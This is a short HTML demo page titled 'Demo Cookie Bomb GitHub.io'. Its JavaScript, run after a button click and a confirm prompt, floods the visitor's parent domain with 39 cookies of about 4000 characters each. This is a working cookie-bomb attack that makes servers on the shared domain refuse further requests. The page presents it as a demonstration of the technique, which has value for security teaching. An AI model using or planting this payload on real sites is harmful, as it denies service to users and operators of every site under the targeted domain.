<!DOCTYPE html>
<html>
<head>
<script>
function CookieBomb() {
    var base_domain = document.domain.substr(document.domain.indexOf('.'));
    var pollution = Array(4000).join('a');
    if(confirm('Should I Cookie Bomb '+base_domain+'?')){
    for(var i=1;i<40;i++){
        document.cookie='bomb'+i+'='+pollution+';Domain='+base_domain+';Path=/;SameSite=None;Secure';
    }
}
}
</script>
</head>
<body>

<h2>Demo Cookie Bomb GitHub.io</h2>

<button type="button" onclick="CookieBomb()">Bombardear me</button>
